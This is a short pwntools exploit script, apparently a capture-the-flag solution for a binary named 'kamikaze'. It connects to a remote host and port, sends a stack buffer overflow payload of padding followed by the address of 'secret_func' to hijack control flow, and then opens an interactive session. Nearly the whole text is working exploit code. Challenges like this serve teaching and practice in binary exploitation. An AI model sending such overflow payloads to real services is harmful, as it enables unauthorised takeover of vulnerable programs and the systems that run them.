from pwn import *
context.arch = 'amd64'

#     nc 13.48.67.196 50000

r = remote('13.48.67.196', 50000)

# r = process('./kamikaze')
secret_func = 0x400807

offset = 0x7ffdbba7bbe0 - 0x7ffdbba7bba0 + 2 - 56 
payload = 'a' * offset + p64(secret_func)
pause()

r.sendlineafter(': ', payload)
r.interactive()
